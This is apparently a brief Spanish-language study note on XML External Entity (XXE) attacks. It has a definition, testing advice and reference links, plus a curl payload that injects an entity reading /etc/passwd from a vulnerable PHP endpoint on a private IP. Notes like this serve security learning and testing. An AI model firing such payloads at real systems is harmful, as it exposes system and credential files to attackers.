Un ataque XML External Entity(Entidad Externa XML) se da contra aplicaciones que procesan datos en formato XML, una falta de sanitización propiamente aplicada permite al atacante inyectar entidades XML maliciosas a la aplicación. La mala configuración del parser o el uso de uno anticuado procesará los input XML externos.

Si un endpoint admite input y se procesa como XML, probar XXE

# Payloads

```zsh
curl -d '<?xml version="1.0" encoding="UTF-8"?>               
<!DOCTYPE test [     
 <!ENTITY xxe SYSTEM "file:///etc/passwd">  
]>  
<test>&xxe;</test>' http://192.168.1.140/vuln-endpoint.php
```
### Artículos
[PortSwigger](https://portswigger.net/web-security/xxe)
[PATT](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
[OWASP](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
[Hacker One + ejemplos](https://www.hackerone.com/knowledge-center/xxe-complete-guide-impact-examples-and-prevention)
[Imperva](https://www.imperva.com/learn/application-security/xxe-xml-external-entity/)
[Wallarm](https://lab.wallarm.com/what/a4-entidades-externas-xml-xxe/?lang=es)
[Que es XML](https://developer.mozilla.org/es/docs/Web/XML/Guides/XML_introduction)
[Aplicaciones XML](https://developer.mozilla.org/es/docs/Web/XML/Guides/XML_introduction)
[Que es un parser](https://www.arimetrics.com/glosario-digital/analizador-sintactico-parser)
[Buscar XXE con BurpSuite](https://youtu.be/99_eeZ-x_7E)